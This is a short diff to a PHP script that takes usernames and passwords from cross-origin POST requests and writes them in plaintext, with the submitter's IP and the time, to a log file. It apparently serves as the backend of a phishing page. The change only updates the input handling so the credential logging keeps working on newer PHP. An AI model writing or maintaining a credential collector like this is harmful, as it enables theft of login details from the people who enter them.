@@ -1,8 +1,8 @@
 <?php
 header("Access-Control-Allow-Origin: *"); // Allow CORS for AJAX
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = filter_input(INPUT_POST, "username", FILTER_SANITIZE_STRING);
-    $password = filter_input(INPUT_POST, "password", FILTER_SANITIZE_STRING);
+    $username = htmlspecialchars(trim($_POST["username"] ?? ""), ENT_QUOTES, 'UTF-8');
+    $password = htmlspecialchars(trim($_POST["password"] ?? ""), ENT_QUOTES, 'UTF-8');
     
     // Log data to file
     $data = "Username: $username, Password: $password, IP: " . $_SERVER["REMOTE_ADDR"] . ", Time: " . date("Y-m-d H:i:s") . "\n";
